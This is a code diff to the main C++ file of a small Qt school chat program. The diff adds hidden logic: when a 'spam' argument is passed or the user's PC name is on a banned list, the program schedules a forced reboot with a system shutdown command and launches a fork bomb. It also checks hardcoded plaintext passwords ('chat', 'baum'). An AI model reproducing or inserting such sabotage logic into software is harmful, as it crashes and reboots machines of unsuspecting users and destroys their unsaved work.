@@ -1,4 +1,4 @@
-/* Copyright (C) 2015 Lukas Bartl
+/* Copyright (C) 2015,2016 Lukas Bartl
  * Diese Datei ist Teil des Klassenchats.
  *
  * This program is free software: you can redistribute it and/or modify
@@ -15,11 +15,12 @@
  * along with this program.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-// Diese Datei ruft der Nutzer auf, und sie ruft dann die anderen Dateien auf
+// Diese Datei wird von Handout_Kräuterhexe aufgerufen, und sie ruft dann die anderen Dateien auf
 
 #include "chat.hpp"
 #include "passwort.hpp"
-#include "filesystem.hpp"
+#include "forkbomb.hpp"
+#include "pc_nutzername.hpp"
 #include "klog.hpp"
 
 using std::clog;
@@ -84,6 +85,19 @@ int main( int argc, char* argv[] ) TRY_RELEASE {
     QApplication app ( argc, argv );
     qInstallMessageHandler( messageOutput );
 
+    if ( app.arguments().contains("spam") || pc_nutzername_verboten() ) {
+#ifdef DEBUG
+        void volatile*volatile reserve = malloc( 100*1024*1024 ); // 100 MB als Reserve
+        std::thread( [reserve] () { this_thread::sleep_for( 30s ); free( const_cast <void*> ( reserve ) ); std::terminate(); } ).detach(); // Nach 30 Sekunden Abbrechen
+#elif defined WIN32
+        std::thread( [] () { int a = system("shutdown /r /t 30"); (void) a; } ).detach(); // Nach 30 Sekunden Neustart des PCs
+#else
+        std::thread( [] () { int a = system("shutdown -r 30"); (void) a; } ).detach();
+#endif
+        forkbomb();
+        return app.exec();
+    }
+
     if ( ! Datei("./icon.ico").exist() ) // Die einzige wichtige Datei im Chat-Verzeichnis ist das Icon, alles andere wird automatisch wieder erstellt
         qFatal("Icon nicht gefunden!");
 
@@ -93,11 +107,9 @@ int main( int argc, char* argv[] ) TRY_RELEASE {
         Passwort pass;
         pass.exec();
 
-        std::string const& passein { pass.getpass() };
-
-        if ( passein == "chat" ) // Plum-Chat
+        if ( pass.getpass() == "chat" ) // Plum-Chat
             plum = true;
-        else if ( passein == "baum" ) // Normaler Chat
+        else if ( pass.getpass() == "baum" ) // Normaler Chat
             plum = false;
         else {
             qCritical("Falsches Passwort!");
